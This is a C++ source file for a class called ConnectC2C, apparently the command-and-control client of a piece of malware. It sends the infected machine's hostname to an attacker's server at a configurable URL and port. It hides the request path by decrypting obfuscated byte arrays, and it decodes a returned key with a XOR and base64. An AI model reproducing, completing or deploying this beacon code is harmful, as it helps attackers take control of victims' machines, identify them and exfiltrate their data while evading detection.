#include "ConnectC2C.h"

#include <string>
#include <cpr/cpr.h>
#include "base64.h"
#include "Header.h"
#include <iostream>
ConnectC2C::ConnectC2C()
{
}

ConnectC2C::ConnectC2C(std::string url, uint16_t port)
{
	this->url = url;
	this->port = port;

}

std::string ConnectC2C::sendRequest(std::string hostname)
{
	std::vector<unsigned char> v1({ 229, 81, 148, 83, 28, 184 });
	std::vector<unsigned char> v2({ 32, 240, 171, 247, 46, 151 });
	std::string kitty = decrypt(
		v1, v2,
		42
	);
	// std::cout << this->url + ':' + std::to_string(this->port) + kitty << std::endl;
	auto r = cpr::Get(
		cpr::Url{ this->url + ':' + std::to_string(this->port) + kitty},
		cpr::Parameters{ {"hostname", hostname} }
	);
	if (r.status_code != 200) {
		return "";
	}
		
	return r.text;
}



std::string ConnectC2C::decryptKey(std::string encrypted_key)
{
	std::string result; 
	for (char& c : encrypted_key) {
		result += c ^ 0x42;
	}
	return result;
}

void ConnectC2C::set_url(std::string url)
{
	this->url = url;
}

void ConnectC2C::set_port(std::uint16_t port)
{
	this->port = port;
}

std::string ConnectC2C::decode(std::string text)
{
	return base64_decode(text);
}

